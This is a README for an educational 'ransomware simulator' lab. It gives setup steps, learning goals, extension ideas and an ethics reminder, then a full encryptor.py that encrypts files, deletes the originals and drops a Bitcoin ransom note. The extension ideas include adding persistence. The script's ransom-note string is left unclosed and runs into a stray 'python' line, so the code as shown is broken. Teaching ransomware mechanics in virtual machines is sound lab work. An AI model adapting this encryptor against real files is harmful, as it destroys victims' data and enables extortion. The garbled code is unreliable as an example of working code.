# Webdeves Ethical Hacking Project (Team Evil)
# Ransomware Simulator Project (Ethical Hacking Lab)

## Objective
Simulate a ransomware attack in a controlled environment to understand how file encryption and ransom messages work. This project is strictly for **educational purposes** and should only be executed inside **virtual machines** on **test files** but will be used to build your confidence as an ethical hacker.


## Project Structure
```
ransomware_simulator/
│
├── encryptor.py            # Script to encrypt files and drop ransom note
├── decryptor.py            # Script to decrypt files with a key
├── key.key                 # Generated encryption key
├── ransom_note.txt         # Template ransom message (used in script)
├── demo_files/             # Test files that will be encrypted
└── README.md               # Instructions and documentation
```

- Only run this in **virtual machines**.
- Use only the `demo_files/` folder with dummy/test files.
- Never target system folders or real documents.
- Understand the legal and ethical implications before testing.


## Getting Started

### Step 1: Setup Environment
- Python 3.7+
- Install dependencies:
```bash
pip install cryptography
```
- Create test files in `demo_files/` folder (e.g. `.txt`, `.docx`, `.jpg`)

### Step 2: Run Encryptor
```bash
python encryptor.py
```
This will:
- Encrypt all files in `demo_files/`
- Replace originals with `.enc` files
- Create a ransom note called `README.txt`

### Step 3: Decryption
You’ll use the `decryptor.py` script and the `key.key` file to recover the original files. This will simulate what happens when a victim "pays the ransom".



## decryptor.py (To be added)
You will load:
- Load the `key.key`
- Decrypt each `.enc` file in the folder
- Recreate the original files

## Learning Outcomes
- Understand how ransomware operates
- Learn file encryption/decryption using `cryptography`
- Explore defense mechanisms and detection strategies
- Discuss ethical and legal implications of malware simulation



## Extension Ideas
- Add a GUI popup with countdown timer
- Simulate file extension hiding
- Add basic persistence (autostart simulation)
- Build a basic ransomware detector script (blue team exercise)



##  Submission Checklist
- [ ] `encryptor.py` script completed
- [ ] `decryptor.py` script created
- [ ] Test run and screenshot of encrypted files
- [ ] Report (1 page): What you learned + detection methods



## Ethics Reminder
This project is for educational cybersecurity use only. Misusing this knowledge is illegal and unethical. Respect privacy, security, and laws at all times.

## encryptor.py

```Python
from cryptography.fernet import Fernet
import os, glob

# Create and store encryption key
key = Fernet.generate_key()
with open("key.key", "wb") as f:
    f.write(key)

fernet = Fernet(key)

# Folder containing files to simulate encryption
folder = "demo_files/"
os.makedirs(folder, exist_ok=True)

# Encrypt all files in folder
for filepath in glob.glob(folder + "*"):
    if filepath.endswith(".enc") or filepath.endswith("README.txt"):
        continue
    with open(filepath, "rb") as f:
        data = f.read()
    encrypted = fernet.encrypt(data)
    with open(filepath + ".enc", "wb") as f:
        f.write(encrypted)
    os.remove(filepath)

# Drop ransom note
ransom_note = """
--- YOUR FILES HAVE BEEN ENCRYPTED ---
To recover your data, send 1 BTC to the following address:
1A2b3C4d5E6f7G8h9I0j
Then contact us with proof of payment.
You have 48 hours before your files are lost forever.

python
with open(folder + "README.txt", "w") as f:
    f.write(ransom_note)

print("[+] Files encrypted. Ransom note dropped.")
```
